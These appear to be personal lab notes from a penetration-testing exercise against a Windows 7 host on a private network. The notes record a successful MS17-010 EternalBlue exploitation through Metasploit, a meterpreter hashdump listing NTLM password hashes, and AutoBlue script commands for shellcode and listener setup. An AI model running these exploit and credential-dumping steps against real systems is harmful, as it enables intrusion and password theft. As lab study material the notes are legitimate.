27/12/2023

- ip 192.168.60.5

- Windows 7 Ultimate 7601 Service Pack 1
- found eternalblue exploit

2 ways to check if a vulnerabiltiy is applicable 
- use an auxillary module 
- use an exploit and use `check` command 

### used  `auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection` -> no result

### used `exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption`
- `check` gives *The target is vulnerable.* 
exploited succesfully

- use `hashdump` to get hashes
> meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58f5081696f366cdc72491a2c4996bd5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:f580a1940b1f6759fbdd9f5c482ccdbb:::
user:1000:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::

### used https://github.com/3ndG4me/AutoBlue-MS17-010.git
> ┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]
└─# python eternal_checker.py 192.168.60.5
[*] Target OS: Windows 7 Ultimate 7601 Service Pack 1
[!] The target is not patched
=== Testing named pipes ===
[*] Done

```
sudo ./shell_prep.sh
sudo ./listener_prep.sh 
python eternalblue_exploit7.py 192.168.60.5 shellcode/sc_all.bin

```

